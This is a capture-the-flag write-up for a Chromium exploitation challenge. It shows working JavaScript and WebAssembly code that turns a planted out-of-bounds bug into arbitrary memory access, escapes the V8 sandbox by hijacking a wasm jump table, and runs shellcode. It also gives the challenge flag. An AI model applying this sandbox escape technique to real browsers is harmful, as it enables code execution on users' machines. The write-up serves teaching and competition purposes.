# Title

Übercaged

## Description

Oh, nice, OOB RW, this can't be tough to exploit, right? Right...?

- We are running modified version of the chromium browser. The challenge is to exploit introduced vulnerability, to read contents of /ubercaged/flag.txt. You can find already prebuilt and symbolized packages in x64.debug and x64.release. On the server we will use x64.release. You can fully reproduce server environment using presented dockerfile (`chall-docker`). Don't forget, that the container has access to the internet, so if you need you can send the flag to remote listener.
- If you really want to build chromium by yourself you can use provided docker under `build-chromium-docker`.

## Solution

You can find the full exploit here: [pwn.js](./writeup/pwn.js).

So, we have a modified version of the Chromium browser (`120.0.6099.228`), which has an out-of-bounds read/write vulnerability through custom `readAt`/`wrtieAt` array methods. A few years ago, that would have given us shellcode execution (almost) right away, but nowadays, it's a bit more complicated. In the latest Chromium versions, a V8 sandbox (ubercage) was introduced, which aims to prevent crafting arbitrary memory read/write primitives by "sandboxing" the JSObject heap. You can read more about it [here](https://chromium.googlesource.com/v8/v8.git/+/refs/heads/main/src/sandbox/README.md).

Anyways, let's start hacking.

First of all, let's build the `v8h_addrOf` primitive whose purpose is to leak the address of a given object. It is defined as follows:

```js
var compressed_address_extractor = []

// Get the offset of object inside v8's ubercage
function v8h_addrOf(obj) {
    compressed_address_extractor[0] = obj;
    return compressed_address_extractor.readAt(0).f2i().low();
}
```

We essentially achieve this primitive for "free" as the `readAt` function always works with primitive types, so even though we've saved an object, we can read it as if it was a number.

With this done let's work on `v8h_read64` and `v8h_write64` primitives. These primitives are constructed as it is usually done in the V8 exploitation world.

```js
// oob read/write arrays it consists of floats, to be able to read/write pointers as floats
var oob_array = [1.1, 2.2, 3.3, 4.4]
// Array whose elements ptr we'll corrupt to achieve caged arb read/write
var rw_array = [1.1, 2.2, 3.3, 4.4]

function v8h_read64(offset) {
    // Read the old value and update only the offset part
    let updated = (oob_array.readAt(12).f2i() & 0xffffffff00000000n) | offset.tag();
    // Backing "caged pointer" of the rw_array
    oob_array.writeAt(12, updated.i2f());
    return rw_array[0].f2i();
}

function v8h_write64(offset, value) {
    // Read the old value and update only the offset part
    let updated = (oob_array.readAt(12).f2i() & 0xffffffff00000000n) | offset.tag();
    // Backing "caged pointer" of the rw_array
    oob_array.writeAt(12, updated.i2f());
    rw_array[0] = value.i2f();
}
```

We define 2 arrays, `oob_array` and `rw_array`. The `oob_array` is used to corrupt the backing store of the `rw_array` which essentially allows us to read/write arbitrary memory (inside the sandbox).

Now that this is complete, we finally can work on escaping the Ubercage.

As the Ubercage is still a relatively new feature, not all of the code has been adapted to it. For example, the wasm object still uses some native pointers, that are reachable from the JSObject heap. We can use this to our advantage. One such pointer is the `jumptable_ptr` which allows us to achieve 2 things:

1. Find the address of the compiled wasm code
2. Get the pc control when a new function is called for the first time

Crafting a multishot `arb_write64` (uncaged) will require a little bit of work. We'll start by defining a number of wasm functions.

The first one will be used to "smuggle" a `mov QWORD PTR [rax], rdx` gadget into the liftoff-compiled function code:

```wat
(func $arb_write_gadget (export "arb_write_gadget")
  (result i64)
  i64.const 0x90909090_90108948 ;; mov QWORD PTR [rax], rdx;
)
```

The second one will be used to achieve one-shot arbitrary write outside of the sandbox:

```wat
;; We use this function to overwrite the beginning arb_write64 with the arb_write_gadget = mov QWORD PTR [rax], rdx;
(func $arb_write64_one_shot (export "arb_write64_one_shot")
  (param $addr i64)  ;; Address to write to (rax)
  (param $value i64) ;; 64-bit integer to write (rdx)
  (result i64)
  
  i64.const 0x90909090_90909090
)
```

The third one gives us a multi-shot arbitrary write primitive:

```wat
;; This one is the multishot version of the previous one
(func $arb_write64 (export "arb_write64")
  (param $addr i64)  ;; Address to write to (rax)
  (param $value i64) ;; 64-bit integer to write (rdx)
  (result i64)
  
  i64.const 0x90909090_90909090
)
```

And finally, the last 2 functions will be used as a shellcode buffer and a shellcode execution trigger:

```wat
;; This one is the location where we will write the shellcode
(func $shellcode_buffer (export "shellcode_buffer")
  (result i64)
  i64.const 0x90909090_90909090
)

;; This function will trigger the shellcode execution
(func (export "exec_shellcode")
  nop
)
```

With this in place, we can move on to the exploitation part.

We start by extracting the value of the `jumptable_ptr` and calculating the offsets of interest:

```js
const JUMP_TABLE_PTR_OFF = 0x40n;
let jumptable_ptr = v8h_read64(wasm_instance_offset + JUMP_TABLE_PTR_OFF);

// Offsets inside the compiled wasm code.
const ARB_WRITE64_ONE_SHOT_OFF = 0xb80n;
const ARB_WRITE64_GADGET_OFF = ARB_WRITE64_ONE_SHOT_OFF + 0x1an;
const ARB_WRITE64_OFF = 0xc00n;
const ARB_WRITE64_INSTR_TO_OVERWRITE_OFF = ARB_WRITE64_OFF + 0x18n;
const SHELLCODE_BUFFER_OFF = 0xc80n;

// Address of the "smuggled" gadget
let arb_write64_gadget_addr = jumptable_ptr + ARB_WRITE64_GADGET_OFF;
// Address of the instruction inside the `arb_write64` function that we want to overwrite with the `mov QWORD PTR [rax], rdx;` instruction
let arb_write64_instr_to_overwrite_addr = jumptable_ptr + ARB_WRITE64_INSTR_TO_OVERWRITE_OFF;
// Address of the shellcode buffer
let shellcode_buffer_addr = jumptable_ptr + SHELLCODE_BUFFER_OFF;
```

Next, we'll invoke the smuggled gadget by overwriting the `jumptable_ptr` with the address of the gadget, and calling the `arb_write64_one_shot` function. The parameters for this call are the address of the instruction inside the `arb_write64` we want to overwrite and the value of the gadget. We know that the first parameter will be passed in `rax`, and the second one in `rdx`.

As a result of this operation, the `arb_write64` function will be overwritten with the `mov QWORD PTR [rax], rdx;` instruction, essentially giving us an arbitrary write primitive.

```js
v8h_write64(wasm_instance_offset + JUMP_TABLE_PTR_OFF, arb_write64_gadget_addr - 5n);
arb_write64_one_shot(arb_write64_instr_to_overwrite_addr, 0x9090909090108948n);
```

Near the end, we can use newly crafted `arb_write64` primitive to write the shellcode to the `shellcode_buffer`:

```js
let shellcode = [
    ...
]

shellcode.forEach((value, index) => {
    arb_write64(shellcode_buffer_addr + BigInt(index * 8), value);
});
```

And finally, we can trigger the shellcode execution:

```js
// Jump to the shellcode
v8h_write64(wasm_instance_offset + JUMP_TABLE_PTR_OFF, shellcode_buffer_addr - 5n);
exec_shellcode();
```

Which will give us the flag.

N.B. In the challenge I've purposefully set the `V8_HAS_PKU_JIT_WRITE_PROTECT` to `0`, as PKU complicates exploitation process by actually making the memory mappings W^X, utilizing `pkey_mprotect`. You can read more about it [here](https://docs.kernel.org/core-api/protection-keys.html).

References

1. [V8 Sandbox (aka. Ubercage)](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit?usp=sharing)
2. [Google Chrome V8 CVE-2024-0517 Out-of-Bounds Write Code Execution](https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/)
3. [Abusing Liftoff assembly and efficiently escaping from sbx](https://retr0.zip/blog/abusing-Liftoff-assembly-and-efficiently-escaping-from-sbx.html)

## Flag

SAS{w1th_gr34t_p0wer_n0_mitig4t1on_c4n_b3_4_pr0bl3m}

**Solved by:** 7 teams